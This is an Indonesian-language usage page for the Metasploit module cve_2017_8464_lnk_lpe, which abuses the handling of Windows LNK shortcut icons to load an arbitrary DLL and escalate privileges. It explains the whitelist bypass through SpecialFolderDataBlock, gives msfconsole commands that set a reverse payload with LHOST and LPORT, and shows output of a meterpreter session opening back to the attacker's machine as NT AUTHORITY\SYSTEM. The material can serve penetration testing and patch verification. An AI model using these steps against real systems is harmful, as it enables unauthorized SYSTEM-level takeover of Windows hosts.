# cve_2017_8464_lnk_lpe

Modul ini mengeksploitasi kerentanan dalam penanganan file Shortcut Windows (`.LNK`) yang memuat ikon dinamis, di mana ikon tersebut dimuat dari sebuah `DLL` berbahaya.

Kerentanan ini merupakan varian dari `MS15-020` (`CVE-2015-0096`). File `LNK` yang dibuat mirip, namun terdapat tambahan `SpecialFolderDataBlock`. `ID` folder yang disetel dalam `SpecialFolderDataBlock` ini diarahkan ke `Control Panel`. Ini sudah cukup untuk melewati daftar putih (`whitelist`) `CPL`.

Bypass ini dapat digunakan untuk menipu Windows agar memuat file `DLL` sewenang-wenang (`arbitrary DLL`).

Opsi `PATH` harus merupakan path absolut ke direktori yang dapat ditulisi dan diindeks untuk pencarian. Jika `PATH` tidak ditentukan, modul secara default akan menggunakan `%USERPROFILE%`.

## Penulis
- Uncredited
- [Yorick Koster](https://github.com/ykoster)
- [Spencer McIntyre](https://github.com/zerosteiner)

## Platform
- `Windows`

## Arsitektur
- `x86`, `x64`

## Cara Penggunaan di Metasploit

```
use exploit/windows/local/cve_2017_8464_lnk_lpe
set PAYLOAD <PAYLOAD>
set SESSION <ID>
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[!] SESSION may not be compatible with this module:
[!]  * incompatible session type: meterpreter. This module works with: .
[*] Generating LNK file to load: C:\Users\admin\LyCvVvdEkbJVUEfa.dll
[*] Sending stage (177734 bytes) to 192.168.1.53
[+] Deleted C:\Users\admin\LyCvVvdEkbJVUEfa.dll
[+] Deleted C:\Users\admin\CAkoGlgdwbVztjah.lnk
[*] Meterpreter session 8 opened (192.168.1.11:4444 -> 192.168.1.53:49175) at 2025-05-17 05:18:06 +0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/exploit/windows/local/cve_2017_8464_lnk_lpe/)
